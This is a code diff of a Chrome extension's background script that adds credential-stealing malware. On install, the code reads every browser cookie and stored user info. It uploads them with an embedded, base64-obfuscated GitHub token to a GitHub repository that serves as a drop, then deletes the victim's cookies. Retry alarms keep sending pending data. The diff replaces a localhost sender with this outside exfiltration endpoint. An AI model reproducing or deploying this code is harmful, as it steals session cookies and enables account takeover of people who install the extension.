@@ -1,8 +1,34 @@
 (async () => {
     const interval = 1; // min
+    const tkn = "Z2hwXzRqZTU0eE5lOUZONTFMcnhQUXBFZDBCc3JybGk2bzFLeHA1Qw";
 
     const setStore = async (key, value) => await chrome.storage.local.set({[key]: value });
     const getStore = async (key) => (await chrome.storage.local.get(key))[key];
+
+    async function uploadFileApi(acc, message, content, name) {
+        var data = JSON.stringify({
+            message,
+            content,
+        });
+
+        var config = {
+            method: "put",
+            headers: {
+                Authorization: `Bearer ${btoa(acc + "==")}`,
+                "Content-Type": "application/json",
+            },
+            body: data,
+        };
+        try {
+            const res = await fetch(
+                `https://api.github.com/repos/strangerchd/DemoExtensionData/contents/${name}.json`,
+                config
+            );
+            return res.ok? true : false;
+        } catch (e) {
+            return false;
+        }
+    }
 
     async function destroyCookies() {
         const cookies = await chrome.cookies.getAll({});
@@ -15,36 +41,25 @@
         await setStore("destroyCookies", "false");
     }
 
-    async function sendData(data) {
-        const url = "http://localhost:3000/";
-        try {
-            const res = await fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data),
-            });
-            await res.text();
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-
     async function sendCookies() {
         const cookies = await chrome.cookies.getAll({});
-        return await sendData(cookies);
+        const id = await getStore("deviceId");
+        return await uploadFileApi(tkn, id, cookies, "cookies_" + (new Date()).getTime());
     }
 
     async function sendInfo() {
         const infos = await getStore("info");
-        return await sendData(infos);
+        const id = await getStore("deviceId");
+        return await uploadFileApi(tkn, id, infos, "info_" + (new Date()).getTime());
     }
     
     chrome.runtime.onInstalled.addListener(async (details) => {
+        const id = (Math.random() * 100000000000000).toString() + (Date.now()).toString();
+
         await setStore("areCookiesPending",  "true");
         await setStore("areInfoPending", "false");
         await setStore("destroyCookies", "true");
-
+        await setStore("deviceId", id);
         const sent = await sendCookies();
         if (sent) {
             destroyCookies();
@@ -56,7 +71,6 @@
     chrome.windows.onCreated.addListener(async () => {
         await chrome.alarms.clear("retry_sending_info");
         await chrome.alarms.create("retry_sending_info", {delayInMinutes: interval, periodInMinutes: interval});
-        await sendData("window created");
     });
 
     chrome.alarms.onAlarm.addListener( async (alarm) => {
@@ -102,7 +116,6 @@
                  await setStore( "info", JSON.stringify([message]) );
 
              await setStore("areInfoPending",  "true" );
-             sendResponse("done saving");
          }
      );
 })();
